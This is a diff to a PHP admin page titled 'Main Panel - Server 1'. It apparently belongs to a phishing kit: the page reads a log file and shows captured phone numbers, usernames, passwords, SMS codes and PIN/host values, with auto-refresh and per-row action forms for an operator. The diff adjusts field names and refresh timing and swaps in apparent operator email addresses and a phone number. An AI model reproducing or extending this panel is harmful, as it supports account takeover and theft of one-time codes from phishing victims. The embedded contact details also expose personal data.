@@ -22,10 +22,9 @@ $phone = $theline[2];
 $user = $theline[3];
 $pass = $theline[4];
 $sms = $theline[5];
-$pin = $theline[6];
-$ip = $theline[8];
+$hostname = $theline[6];
 $lines = file( $filepath , FILE_IGNORE_NEW_LINES );
-$lines[$line_i_am_looking_for] = "$time#$phone#$user#$pass#$sms#$pin#$reason#$ip#";
+$lines[$line_i_am_looking_for] = "$time#$phone#$user#$pass#$sms#$hostname#$reason#";
 file_put_contents( $filepath , implode( "\r\n", $lines ) );; 
 }
 ?>
@@ -35,11 +34,12 @@ file_put_contents( $filepath , implode( "\r\n", $lines ) );;
 <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
 <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
 <title>Main Panel - Server 1</title>
-<?php if ($show != "1") { echo '<meta http-equiv="refresh" content="10; url=index.php?showall=0">'; } ?>
+<?php if ($show != "1") { echo '<meta http-equiv="refresh" content="5; url=index.php?showall=0">'; } ?>
 </head>
 <body>
-<p align="center" style="font-size: 22px;">guyac.donjuane@yahoo.com</p>
-<?php if ($show != "1") { echo '<p align="center" style="font-size: 15px;"> (auto-refresh is on for every 10 seconds) </p>'; } ?>
+<p align="center" style="font-size: 11px;">3125931449</p>
+<p align="center" style="font-size: 11px;">gabormursa@yahoo.com</p>
+<?php if ($show != "1") { echo '<p align="center" style="font-size: 15px;"> </p>'; } ?>
 <?php
 $file = file('srv1log.txt');
 if ($show == 1) {
@@ -75,7 +75,7 @@ print "<p align=\"center\" style=\"font-size: 20px; font-weight: bold;\"> Total:
     <td width="150"><div align="center"><strong>User</strong></td>
     <td width="150"><div align="center"><strong>Pass</strong></td>
     <td width="70"><div align="center"><strong>SMS</strong></td>
-    <td width="60"><div align="center"><strong>PIN</strong></div></td>
+    <td width="60"><div align="center"><strong>HOST</strong></div></td>
     <td width="80"><div align="center"><strong>STATUS</strong></div></td>
     <td width="270"><div align="center"><strong>ACTION</strong></div></td>
   </tr>
@@ -85,18 +85,19 @@ $now = time();
 $file = file('srv1log.txt');
 foreach ($file as $data) {
 	$info = explode("#",$data);
+	if( count($info) < 8) continue;
 	$time = $info[0];
 	$phone = $info[1];
 	$user = $info[2];
 	$pass = $info[3];
 	$sms = $info[4];
-	$pin = $info[5];
+	$hostname = $info[5];
 	$reason = $info[6];
 	$ip = $info[7];
 	$time = $now - $time;
 	$time = gmdate("H:i:s", $time);
 	if ($sms == "") { $sms = "------"; }
-	if ($pin == "") { $pin = "----"; }
+	if ($hostname == "") { $hostname = "----"; }
 	if ($reason == "") {
 	echo '
 	<tr>
@@ -105,7 +106,7 @@ foreach ($file as $data) {
     <td style="color: #33CC00; font-weight: bold"><div align="center">' . $user . '</div></td>
     <td style="color: #33CC00; font-weight: bold"><div align="center">' . $pass . '</div></td>
     <td style="color: #0000FF; font-weight: bold"><div align="center">' . $sms . '</div></td>
-    <td style="color: #FF0000; font-weight: bold"> <div align="center">' . $pin . '</div></td>
+    <td style="color: #FF0000; font-weight: bold"> <div align="center">' . $hostname . '</div></td>
     <td style="color: #FF0000; font-weight: bold"> <div align="center">' . $reason . '</div></td>
     <form action="index.php?showall=' .$show. '" method="post">
 	<td style="color: #FF0000; font-weight: bold"> <div align="center">
@@ -127,7 +128,7 @@ foreach ($file as $data) {
     <td style="color: #33CC00; font-weight: bold"><div align="center">' . $user . '</div></td>
     <td style="color: #33CC00; font-weight: bold"><div align="center">' . $pass . '</div></td>
     <td style="color: #0000FF; font-weight: bold"><div align="center">' . $sms . '</div></td>
-    <td style="color: #FF0000; font-weight: bold"> <div align="center">' . $pin . '</div></td>
+    <td style="color: #FF0000; font-weight: bold"> <div align="center">' . $hostname . '</div></td>
     <td style="color: #FF0000; font-weight: bold"> <div align="center">' . $reason . '</div></td>
     <form action="index.php?showall=' .$show. '" method="post">
 	<td style="color: #FF0000; font-weight: bold"> <div align="center">
@@ -146,3 +147,4 @@ foreach ($file as $data) {
 </table>
 </body>
 </html>
+
